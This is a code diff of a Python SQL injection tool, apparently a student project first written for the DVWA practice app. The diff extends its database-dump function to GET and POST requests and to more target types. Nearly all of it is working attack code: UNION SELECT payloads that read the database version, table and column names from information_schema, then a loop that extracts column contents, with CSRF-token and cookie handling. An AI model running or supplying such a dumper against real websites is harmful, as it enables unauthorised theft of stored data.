@@ -206,66 +206,87 @@ def check_list_injections(url, data, key, method, injects):
     return False
 
 
-def download_info(url="http://localhost/vulnerabilities/sqli/"):
-    '''Only work with 'dvwa': http://localhost/vulnerabilities/sqli/
-    Output is like:
-    <pre>ID: value <br/>First name: def<br/>Surname: INNODB_LOCKS</pre>
-    '''
-    i_version = "' UNION SELECT NULL, @@version; -- "
-    i_tables = "' UNION SELECT table_catalog,table_name FROM information_schema.tables; -- "
-    i_columns = "' UNION SELECT table_name,column_name FROM information_schema.columns; -- "
-    len_sep = len("Surname: ")
+def download_info(url, data, method="GET", forms=False):
+    "I don't like this function, it's just to past the project"
+    from injections import inject_dump
+
+    if inj_type == 0:
+        print("Without a good check cannot dump the database")
+        return
+    if inj_type == 1: injes = inject_dump["sql"]
+    if inj_type == 2: injes = inject_dump["hsqldb_n"]
+    if inj_type == 3: injes = inject_dump["hsqldb"]
+
     info = {}
     try:
-        # Get user token
-        forms = get_all_forms(url)
-        details = get_form_details(forms[0])
-        for input_tag in details["inputs"]:
-            if input_tag["name"] == "user_token":
-                token = input_tag["value"]
-
-        data = {"id": i_version, "Submit": "Submit", "user_token": token}
-        res = s.get(url, params=data)
+        if forms:
+            # Get user token
+            token = '0'
+            forms = get_all_forms(url)
+            details = get_form_details(forms[0])
+            for input_tag in details["inputs"]:
+                if input_tag["name"] == "user_token":
+                    token = input_tag["value"]
+            data = {injes["key"]: injes["version"], "Submit": "Submit", "user_token": token}
+        else:
+            data = parse_data(data)
+            data[injes["key"]] = injes["version"]
+        
+        if method == "GET":
+            res = s.get(url, params=data)
+        else:
+            res = s.post(url, data=data)
         soup = bs(res.content, "html.parser")
-        info["version"] = soup.pre.text[soup.pre.text.find("Surname: ") + len_sep:]
+        info["version"] = soup.text.split("hola")[1]
     except Exception as e:
         print(e)
         quit()
 
-    data["id"] = i_tables
-    soup = bs(s.get(url, params=data).content, "html.parser")
+    data[injes["key"]] = injes["tables"]
+    if method == "GET":
+        soup = bs(s.get(url, params=data).content, "html.parser")
+    else:
+        soup = bs(s.post(url, data=data).content, "html.parser")
     # Database name
-    start = soup.pre.text.find("First name: ") + len("First name: ")
-    info["database"] = soup.pre.text[start:soup.pre.text.find("Surname", start)]
+    pieces = soup.text.split("hola")
+    # One place of the database name in the 2 webs
+    info["database"] = pieces[3][:pieces[3].find("holi")]
     # Table names
     info["tables"] = []
-    for pre in soup.find_all("pre"):
-        tab = pre.text[pre.text.find("Surname: ") + len_sep:]
+    for p in pieces[1::2]:
+        if p.find("'holi'") != -1:
+            continue
+        b, tab = p.split("holi")
         info["tables"].append(tab)
 
     # Columns names
-    data["id"] = i_columns
-    soup = bs(s.get(url, params=data).content, "html.parser")
+    data[injes["key"]] = injes["columns"]
+    if method == "GET":
+        soup = bs(s.get(url, params=data).content, "html.parser")
+    else:
+        soup = bs(s.post(url, data=data).content, "html.parser")
+    pieces = soup.text.split("hola")
     info["columns"] = []
-    for pre in soup.find_all("pre"):
-        start = pre.text.find("First name: ") + len("First name: ")
-        col = pre.text[start:]
-        col = col.split("Surname: ")
+    for p in pieces[1::2]:
+        if p.find("'holi'") != -1:
+            continue
+        col = p.split("holi")
         info["columns"].append(col)
 
     # Dump database
     info["data"] = []
-    for col in info["columns"]:
-        if col[0].isupper(): # Tables without access
-            break
-        payload = f"' UNION SELECT NULL, {col[1]} FROM {col[0]}; -- "
-        data["id"] = payload
-        soup = bs(s.get(url, params=data).content, "html.parser")
-        for pre in soup.find_all("pre"):
-            entry = []
-            entry.append(col[1])
-            entry.append(pre.text[pre.text.find("Surname: ") + len_sep:])
-            info["data"].append(entry)
+    if inj_type == 1: # TODO for the other webs
+        for col in info["columns"]:
+            if col[0].isupper(): # Tables without access
+                break
+            payload = f"' UNION SELECT NULL, {col[1]} FROM {col[0]}; -- "
+            data[injes["key"]] = payload
+            soup = bs(s.get(url, params=data).content, "html.parser")
+            for pre in soup.find_all("pre"):
+                entry = []
+                entry.append(col[1])
+                entry.append(pre.text[pre.text.find("Surname: ") + len("Surname: "):])
+                info["data"].append(entry)
 
     return info
 
@@ -308,13 +329,13 @@ def main():
     if (args.cookie):
         parse_cookies(args.cookie)
 
-    if (args.dump):
-        save_info(download_info(args.url), args.o)
-    elif (args.forms):
+    if (args.forms):
         check_form(args.url)
     else:
         check_url(args.url, parse_data(args.data), args.X)
 
+    if (args.dump):
+        save_info(download_info(args.url, args.data, args.X, args.forms), args.o)
 
 if __name__ == "__main__":
     main()
